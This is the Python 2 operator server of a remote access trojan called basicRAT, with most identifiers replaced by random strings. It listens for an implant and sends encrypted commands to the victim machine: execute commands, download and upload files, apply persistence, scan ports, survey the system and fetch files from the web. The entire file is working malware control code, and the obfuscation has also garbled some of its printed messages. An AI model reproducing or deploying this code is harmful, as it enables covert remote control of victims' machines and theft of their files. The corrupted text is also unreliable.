#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import XYaDaLCpdDWbhHDijfqwaNYabStIUUmh,ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS,vDmzYcBordgiIogLivOuAQaaFTKQAAzM
    from core.filesock import WxGcwiPDYRLzbqatyPwfpKjEErHxBDJt, kQpMdhVtDbXGIdiCoexmQnzVVIsSBSlE
except ImportError as xemCHVWpPapzHfyUCllmfgFOZDAoExtv:
    print xemCHVWpPapzHfyUCllmfgFOZDAoExtv
    sys.exit(0)
ZJdkUYhystIzoewjIYwsxrsfYZCrTAHj = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
YqvDzbdaXgJSvZDcMOmZqqRfiEoxoFJH = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
ATVmVNGpyVhIGAdUgBCneEmKXsgnBWns = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def xCtFmNqhzshSrBUMMddVtHzGmFkEjVgo():
    ALcBZFXmmfJlNzGTJKhxMnveaKsaasIE = argparse.ArgumentParser(description='basicRAT server')
    ALcBZFXmmfJlNzGTJKhxMnveaKsaasIE.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return ALcBZFXmmfJlNzGTJKhxMnveaKsaasIE
def xTbkhCtSUzQGTErSQyvaqKDHBfCsaeBT():
    ALcBZFXmmfJlNzGTJKhxMnveaKsaasIE  = xCtFmNqhzshSrBUMMddVtHzGmFkEjVgo()
    WZXeGIWPzZCAZZmNuHAgLrongMhouFRv    = vars(ALcBZFXmmfJlNzGTJKhxMnveaKsaasIE.parse_args())
    KTdDVvHypMOYfZseppvPkJuGTDVxNpmJ    = WZXeGIWPzZCAZZmNuHAgLrongMhouFRv['port']
    KnysYSpUilAculyoRPGzkvTtOEZhUaga = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        KnysYSpUilAculyoRPGzkvTtOEZhUaga.bind(('0.0.0.0', KTdDVvHypMOYfZseppvPkJuGTDVxNpmJ))
    except socket.error:
        print 'Error: Unable to start XDVIurgLehrWimASyECuElhMKeGNwcLx, KTdDVvHypMOYfZseppvPkJuGTDVxNpmJ {} in use?'.format(KTdDVvHypMOYfZseppvPkJuGTDVxNpmJ)
        sys.exit(1)
    for HuAdLVWwolbXiathCznoIxPzmegQXecx in YqvDzbdaXgJSvZDcMOmZqqRfiEoxoFJH.split('\n'):
        time.sleep(0.05)
        print HuAdLVWwolbXiathCznoIxPzmegQXecx
    print 'basicRAT XDVIurgLehrWimASyECuElhMKeGNwcLx listening on KTdDVvHypMOYfZseppvPkJuGTDVxNpmJ {}...'.format(KTdDVvHypMOYfZseppvPkJuGTDVxNpmJ)
    KnysYSpUilAculyoRPGzkvTtOEZhUaga.listen(10)
    NCoYWIaDbxhnUzngentVJOPsgaGJfmBv, cRCzaSgLczmbKdNwWbUAiKpnVhMeicUt = KnysYSpUilAculyoRPGzkvTtOEZhUaga.accept()
    ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh = vDmzYcBordgiIogLivOuAQaaFTKQAAzM(NCoYWIaDbxhnUzngentVJOPsgaGJfmBv, XDVIurgLehrWimASyECuElhMKeGNwcLx=True)
    while True:
        RizBQYjABXlysRlxdnMYXySnYmOeURfT = raw_input('\n[{}] basicRAT> '.format(cRCzaSgLczmbKdNwWbUAiKpnVhMeicUt[0])).rstrip()
        if not RizBQYjABXlysRlxdnMYXySnYmOeURfT:
            continue
        RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ, _, action = RizBQYjABXlysRlxdnMYXySnYmOeURfT.partition(' ')
        if RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ not in ATVmVNGpyVhIGAdUgBCneEmKXsgnBWns:
            print 'Invalid command, type "help" to see nOYhifUvdvbcfbcnoxEbnAXppSqsoosG list of commands.'
            continue
        if RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'help':
            print ZJdkUYhystIzoewjIYwsxrsfYZCrTAHj
            continue
        NCoYWIaDbxhnUzngentVJOPsgaGJfmBv.send(ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS(RizBQYjABXlysRlxdnMYXySnYmOeURfT, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh))
        if RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'quit':
            KnysYSpUilAculyoRPGzkvTtOEZhUaga.close()
            sys.exit(0)
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'run':
            jMqFBnQNyQhXXLwVqejmDkXMuFAbqIoF = NCoYWIaDbxhnUzngentVJOPsgaGJfmBv.recv(4096)
            print XYaDaLCpdDWbhHDijfqwaNYabStIUUmh(jMqFBnQNyQhXXLwVqejmDkXMuFAbqIoF, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh).rstrip()
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'download':
            for CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE in action.split():
                CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE = CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE.strip()
                WxGcwiPDYRLzbqatyPwfpKjEErHxBDJt(NCoYWIaDbxhnUzngentVJOPsgaGJfmBv, CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh)
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'upload':
            for CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE in action.split():
                CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE = CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE.strip()
                kQpMdhVtDbXGIdiCoexmQnzVVIsSBSlE(NCoYWIaDbxhnUzngentVJOPsgaGJfmBv, CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh)
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'rekey':
            ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh = vDmzYcBordgiIogLivOuAQaaFTKQAAzM(NCoYWIaDbxhnUzngentVJOPsgaGJfmBv, XDVIurgLehrWimASyECuElhMKeGNwcLx=True)
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ)
            jMqFBnQNyQhXXLwVqejmDkXMuFAbqIoF = NCoYWIaDbxhnUzngentVJOPsgaGJfmBv.recv(1024)
            print XYaDaLCpdDWbhHDijfqwaNYabStIUUmh(jMqFBnQNyQhXXLwVqejmDkXMuFAbqIoF, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh)
if __name__ == '__main__':
    xTbkhCtSUzQGTErSQyvaqKDHBfCsaeBT()
